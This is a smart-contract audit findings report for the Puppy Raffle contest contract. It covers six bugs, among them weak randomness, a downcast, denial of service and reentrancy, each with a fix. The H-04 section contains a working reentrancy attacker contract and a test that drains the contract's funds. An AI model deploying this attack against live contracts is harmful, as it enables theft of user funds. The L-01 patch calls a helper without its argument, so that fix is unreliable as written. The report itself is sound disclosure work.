# First Flight #2: Puppy Raffle - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Insecure randomness that can get rare NFT as much as possible](#H-01)
    - ### [H-02. Dangerous downcast that lead to incorrect calculation for ether transfer](#H-02)
    - ### [H-03. The incorrect calculation of the active players lead to denial of service.](#H-03)
    - ### [H-04. Refund function is vulnerable to reentrancy issue that leads to loss of all ethers.](#H-04)
- ## Medium Risk Findings
    - ### [M-01. Incorrect require statement that leads to denial of service](#M-01)
- ## Low Risk Findings
    - ### [L-01. Unexpected behaviour if user depends solely on the function description](#L-01)
    - ### [L-02. Unchecked uint256 value for solidity 0.7.6 version leads to overflow issue](#L-02)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #2

### Dates: Oct 25th, 2023 - Nov 1st, 2023

[See more contest details here](https://www.codehawks.com/contests/clo383y5c000jjx087qrkbrj8)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 4
   - Medium: 1
   - Low: 2


# High Risk Findings

## <a id='H-01'></a>[H-01] Insecure randomness that can get rare NFT as much as possible            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/e01ef1124677fb78249602a171b994e1f48a1298/src/PuppyRaffle.sol#L128

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/e01ef1124677fb78249602a171b994e1f48a1298/src/PuppyRaffle.sol#L139

## Summary
Insecure randomness that use `block.timestamp` and `msg.sender` address as input, which can be predicted by malicious actors.

## Vulnerability Details

Since the malicious user can manipulate the `block.timestamp` or use certain `msg.sender` address value to manipulate the final result.

## Impact

Hacker can get rarity NFT as much as possible if the value is `block.timestamp` and `block.difficulty` is manipulated.


## Tools Used

manual review

## Recommendations

Use Chainlink VRF to get random number from off-chain method.

## <a id='H-02'></a>[H-02] Dangerous downcast that lead to incorrect calculation for ether transfer            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/e01ef1124677fb78249602a171b994e1f48a1298/src/PuppyRaffle.sol#L134

## Summary
The downcast from `uint256` to `uint64` in `PuppyRaffle::totalFees` will lead to the incorrect calculation of ethers transfer, which might lead to token locked in the contract.

## Vulnerability Details

In the `PuppyRaffle::selectWinner` function, the `totalFees` is uint64 type while the `fee` downcast from uint256 to uint64, this will lead to the incorrect calculation to transfer ether. 

## Impact

Consider the calculation of fee in selectWinner function, originally the totalFee value is zero, and the fee value is 100 ether. After the operation of `totalFees = totalFees + uint64(fee);` , the downcast decrease the totalFee from 100,000,000,000,000,000,000 wei to 7,766,279,631,452,241,920 wei. The proof of concept is shown below:

```js
function testUint() public view{
    uint64 totalFee = 0;
    uint256 fee = 100 ether;             // fee is originally 100 ether
    totalFee = totalFee + uint64(fee);   // The downcast is dangerous
    console.log(fee);                    // The correct amount of totalFee should be this value
    console.log(totalFee);               // the amount of totalFee is incorrect
}
```


## Tools Used

manual review and foundry test

## Recommendations

Update the data type of `totalFees` to `uint256` in `PuppyRaffle::selectWinner`

```diff
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players"); // @check some players refund
    uint256 winnerIndex =
        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length; // @bug insecure randomness
    address winner = players[winnerIndex]; 
    uint256 totalAmountCollected = players.length * entranceFee; // @bug mismatch amount since user might refund
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
-   totalFees = totalFees + uint64(fee); // @bug dangerous downcasting
+   totalFees = totalFees + fee;

    uint256 tokenId = totalSupply();

    // We use a different RNG calculate from the winnerIndex to determine rarity
    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100; // @bug insecure randomness
    if (rarity <= COMMON_RARITY) {
        tokenIdToRarity[tokenId] = COMMON_RARITY;
    } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
        tokenIdToRarity[tokenId] = RARE_RARITY;
    } else {
        tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
    }

    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
    (bool success,) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    _safeMint(winner, tokenId);
}
```

## <a id='H-03'></a>[H-03] The incorrect calculation of the active players lead to denial of service.            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/e01ef1124677fb78249602a171b994e1f48a1298/src/PuppyRaffle.sol#L127

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/e01ef1124677fb78249602a171b994e1f48a1298/src/PuppyRaffle.sol#L131

## Summary

The `players` array might have several empty value. The length of player does not equal to the amount of the players registered in the raffle activity since user might refund and quit.

## Vulnerability Details

In the `PuppyRaffle::selectWinner` function, the validation of `players.length` is useless. If there are originally N players registered but M players refund with N≥4 and M≥N-4, the number of active players participated in the activity is lower than 4.

## Impact

The require statement that validates the length of players array becomes useless if the user can refund and quit.
And the calculation of totalAmountCollected is incorrect since it does not take the refund process into consideration. There might much less ether locked in the contract than the value of 
totalAmountCollected if multiple users refund. This will lead to the revert of the function in the ether transfer to the winner in `(bool success,) = winner.call{value: prizePool}("");`
The contract will be never possible to distribute the ether to the winner and reset the start time of the ruffle, which result in the denial of service.

## Tools Used

manual review and foundry test

## Recommendations

Use a new variable, `activePlayerAmount`, to maintain the exact amount of the active players in the contest. Update the `activePlayerAmount` by increasing the length of `newPlayers` array, and decrease the value by one when user invokes refund function.

## <a id='H-04'></a>H-04. Refund function is vulnerable to reentrancy issue that leads to loss of all ethers.            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/e01ef1124677fb78249602a171b994e1f48a1298/src/PuppyRaffle.sol#L101C2-L101C2

## Summary
Not following Check-Effect-Interaction lead to reentrancy attack and result in lost of all the assets within the `PuppyRaffle::refund` function.

## Vulnerability Details
Inside the refund function, the sendValue function is placed before the update of the state variable - players . However, the function does not follow the check-effect-interaction pattern, the state variable update (effect) is placed after the interaction of external function (interaction). This leads to the reentrancy issue and can cause loss of all ethers locked in the contract.

The attacker can write a contract whose receive function invokes the refund function of the protocol. The attacker will reenter the refund function and withdraw the token until the balance become zero.

## Impact

By the foundry testing framework, originally there are 100 ethers balance in the protocol and the hacker address. The hacker first use `PuppyRaffle::enterRaffle` to register the address of attacker contract as player. After that, the attacker contract triggers the attack function and the exploit process starts, and the result shows the balance of the protocol becomes zero.

attacker contract：https://gist.github.com/e3eaff08f00200770df7d4ed3a8b951f.git

For a simple proof-of-concept attacker contract and the corrsponding test:

Attacker Contract
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./PuppyRaffle.sol";
contract Reentrance {
    uint256 index;
    PuppyRaffle puppy;

    constructor(address _addr) {
        puppy = PuppyRaffle(_addr);
    }

    function updateIndex(uint256 _index) public {
        index = _index;
    }

    function attack() public {
        puppy.refund(index);
    }

    receive() external payable {
        if(payable(address(puppy)).balance>0) {
            puppy.refund(index);
        }
    }
}
```

Foundry Test
```js
function testReentranceRefund() public {
    address hacker = makeAddr("hacker");
    deal(address(puppyRaffle), 100 ether); // 100 ether balance in the protocol 
    deal(hacker, 100 ether);               // 100 ether balance in the hacker address

    vm.startPrank(hacker);
    Reentrance reentrance = new Reentrance(address(puppyRaffle)); // create a attacker contract
    address[] memory players = new address[](1);
    players[0] = address(reentrance);
    puppyRaffle.enterRaffle{value: entranceFee}(players);         // register the attacker contract as player
    uint256 beforeAmount = payable(reentrance).balance;
    uint256 index = puppyRaffle.getActivePlayerIndex(address(reentrance));
    reentrance.updateIndex(index);
    reentrance.attack();                                          // start the attack process
    uint256 afterAmount = payable(reentrance).balance;
    vm.stopPrank();

    console.log(beforeAmount);                             // the orignal amount of attacker contract is zero
    console.log(afterAmount);                              // the amount atfter the attack process is 101 ethers.
    console.log(afterAmount-beforeAmount);                 // hacker refund more than it deposits.
    console.log(payable(address(puppyRaffle)).balance);    // the balance of the puppyRaffle becomes 0
}
```

## Tools Used

Manual Review

## Recommendations

There are a few countermeasure to prevent reentrancy issues.
1. follow the Check-Effect-Interaction, moving `players[playerIndex] = address(0)` before `payable(msg.sender).sendValue(entranceFee)` in `PuppyRaffle::refund`.

```diff
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+   players[playerIndex] = address(0);
    payable(msg.sender).sendValue(entranceFee); // @bug(critical) Reentrancy Attack

-   players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}

```

2. use nonReentrant modifier developed by oppenzeppelin within this function.
3. Adopt pull payment architecture designed by openzeppelin


		
# Medium Risk Findings

## <a id='M-01'></a>[M-01] Incorrect require statement that leads to denial of service            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/e01ef1124677fb78249602a171b994e1f48a1298/src/PuppyRaffle.sol#L158

## Summary

`selfdestruct` can send ether to the protocol and cause the requirement in `PuppyRaffle::withdraw` to fail, leading to denial of service.

## Vulnerability Details

Since the contract can receive ether without receive or fallback function if malicious user can `selfdestruct` their contract and send the ether to victim contract. In this case, the contract balance can exceed the value of `totalFees`. 

## Impact

This will lead to the denial of service and the user cannot withdraw the ether from the protocol. All the token will be locked in the contract.

## Tools Used

manual review

## Recommendations

Use `require(address(this).balance >= uint256(totalFees))` instead

# Low Risk Findings

## <a id='L-01'></a>[L-01] Unexpected behaviour if user depends solely on the `PuppyRaffle::getActivePlayerIndex` function description           

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/e01ef1124677fb78249602a171b994e1f48a1298/src/PuppyRaffle.sol#L110

## Summary
The function returns a value that does not match its description under certain situation.

## Vulnerability Details

The `PuppyRaffle::getActivePlayerIndex` function are designed to return the index of an item inside an array. However, the zero value is returned when there is no corresponding items in the array. Consider the first user that leverage the `PuppyRaffle::enterRaffle` function for registration with the first player of the parameter is `addr`. Once the user no longer wants to participants in the contest and try to refund, after checking the `PuppyRaffle::getActivePlayerIndex` function and get zero value. The user can not determine whether it means there is no registration record or the index of `addr` is 0. Due to the logic flaw, the first registration account might lose the right to refund.

## Impact

If an user rely on the return value of `PuppyRaffle::getActivePlayerIndex` to determine whether it can refund. The misleading zero value might cause an user fail to refund properly. This might be a controversy between the project team and the end user.

## Tools Used

Manual review

## Recommendations

There is an unused internal function in the contract, that is, `PuppyRaffle::_isActivePlayer`. This function can be leveraged to determine whether the player is registered or not. After filtering the registration at the very beginning, the function returns the real index of the item.

```diff
function getActivePlayerIndex(address player) external view returns (uint256) {
+		bool active = _isActivePlayer();
+		require(active, "player not exist");
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```
## <a id='L-02'></a>[L-02] Unchecked uint256 value for solidity 0.7.6 version leads to overflow issue            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/e01ef1124677fb78249602a171b994e1f48a1298/src/PuppyRaffle.sol#L86

## Summary

Since the SafeMath library overflow/underflow issues check is applied in Solidity compiler after Solidity 0.8.0 version, therefore there should be extra validations for the uint value operation within this protocol. 

## Vulnerability Details

Inside the enterRaffle function, which takes an address array as input value, there is no validation for an empty array. If an user invoke the function with empty array as input, the first for-loop that use i as index will overflow when calculating `players.length - 1`, the value will become `2**256 - 1`. Although the second layer of for-loop will not execute since j will always be a positive value, which breaks the j < players.length statement since players.length is 0. The for-loop will still take a long time for execution.

## Impact

The user who misuse the input parameter will lead to unexpected behavior and consume a lot of gas.

## Tools Used

Manual Review

## Recommendations

Check the length of address array at the beginning of the function. For example, adding require statement or revert statement when the length of newPlayer is zero.


